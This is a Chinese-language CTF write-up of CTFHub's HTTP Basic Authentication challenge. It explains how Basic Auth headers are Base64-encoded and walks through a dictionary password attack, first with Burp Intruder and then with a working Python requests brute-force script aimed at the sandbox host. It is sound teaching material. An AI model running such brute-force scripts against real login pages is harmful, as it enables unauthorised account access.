【CTFHub】Web-基础认证 Writeup

操作者：何芊宏 | 操作日期：2026.9.15 | 分类：CTF | 标签：CTFHub, Web, HTTP, Python

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - HTTP协议
  • 题目名称：基础认证
  • 提示：HTTP Basic Authentication（基础认证），题目附件提供了一份包含100+常见密码的字典 file.txt。

2. 解题思路

HTTP 基础认证会将“用户名:密码”通过冒号拼接，再进行 Base64 编码，放入请求头的 Authorization 字段中发送给服务器。我们需要使用抓包工具分析认证数据，结合题目提供的密码字典进行爆破。由于 Burp 社区版 Intruder 模块被强制限速，导致爆破效率极低，最终改为使用 Python 的 requests 库编写脚本，利用字典进行自动化爆破，成功绕过限速并命中密码。

3. 操作步骤

第一步：初探与信息收集

开启靶场环境后，点击页面上的 click 链接，弹出账号密码登录框。尝试输入最常见的弱口令 admin / 123456，页面报错提示 401。仔细排查页面后发现官方提供了附件 file.txt，下载并打开后发现是一份包含大量弱口令的密码字典。

第二步：抓包分析与认证原理

使用 Burp Suite 自带浏览器访问靶场，开启代理拦截，再次输入账号密码并抓包。在 HTTP 请求头中发现了关键字段：Authorization: Basic YWRtaW46MTIzNDU2。将其进行 Base64 解码后，得到明文字符串 admin:123456。这意味着我们只要知道用户名，就可以用字典去爆破密码。

第三步：Burp Suite Intruder 爆破尝试（踩坑）

将请求发送至 Intruder，清除默认标记，只选中密码部分的 Base64 编码并添加 Payload 标记。在 Payloads 配置中，将 file.txt 中的100+密码粘贴进列表。配置 Payload Processing 添加前缀 admin: 并进行 Base64 编码。点击开始攻击。

注：Burp 社区版弹窗提示“Intruder 为演示版，功能被限制且攻击速度被强行限制”。跑完 100 多个包耗时极长，且状态码全部返回 401（此时环境可能已经卡顿，无法正确命中）。

第四步：Python 脚本降维打击（终极解法）

由于 Burp 社区版限速严重，决定改用 Python 脚本。在 VS Code 中编写脚本，利用 requests 库的 auth 参数（自动进行拼接和 Base64 编码），实现了秒级爆破。

import requests

url = "http://challenge-03044fac40d28787.sandbox.ctfhub.com:10800/flag.html"

# 假设用户名还是 admin
username = "admin"

# 将file.txt中的密码复制于此
passwords = """
123456
password
line
12345678
qwerty
123456789
admin
...
"""
# 清理密码列表，去掉空格和换行
pwd_list = [p.strip() for p in passwords.split('\n') if p.strip()]

print(f"开始爆破，目标用户: {username}...")

for pwd in pwd_list:
    # requests 的 auth 参数会自动帮你做 Base64 编码，无需手动拼凑
    response = requests.get(url, auth=(username, pwd))
    
    if response.status_code == 200:
        print(f"\n[🎉 成功] 密码是: {pwd}")
        print(f"Flag 是: {response.text}")
        break
    else:
        print(f"[-] 尝试: {pwd} -> 失败 (状态码: {response.status_code})")

终端瞬间跑完 100+ 字典，成功命中正确密码，返回状态码 200，成功获取到真正的 Flag：ctfhub{xxxxxxxxxxxxx}。

4. 踩坑记录与复盘

  • 校园网环境的代理冲突：因为校园网需要学号+密码实名认证，直接修改 Windows 系统代理会影响校园网客户端。后续尽量使用 Burp 自带浏览器，或通过浏览器插件（如 SwitchyOmega）进行代理隔离，避免影响日常网络。
  • Burp 社区版的“致命”限制：Burp 社区版（Community Edition）的 Intruder 模块被官方限速（Time throttled），仅适合验证逻辑或跑极小规模的字典。遇到像本题这样的大规模字典爆破时，应及时切换工具。
  • 自动化脚本的优势：Python 的 requests 库极其轻量，在跑批量请求时速度远超图形化工具。同时，auth 参数自动处理了 Basic Auth 的编码逻辑，代码极其精简。
  • Base64 的本质：Basic Auth 的 Authorization 头部使用的 Base64 只是编码，绝非加密。攻击者可以轻易解码获取明文认证信息，这也是 HTTP 下 Basic Auth 极其脆弱、必须配合 HTTPS 的原因。

5. 知识总结

  • HTTP Basic Auth 认证流程：客户端将用户名与密码以 : 连接，通过 Base64 编码后放入 Authorization: Basic xxx 请求头中。服务器验证失败返回 401，成功返回 200。
  • Burp Suite Intruder 编码配置：在 Payload Processing 中可以灵活使用 Add prefix 添加前缀（如 admin:），再配合 Encode - Base64，能够自动化生成符合 Basic Auth 规范的请求载荷。
  • Python requests 库的高效爆破：使用 requests.get(url, auth=(username, password)) 可以在无需手动处理 Base64 和请求头的情况下，实现优雅的自动化爆破，是 CTF 中处理大规模字典的必备武器。
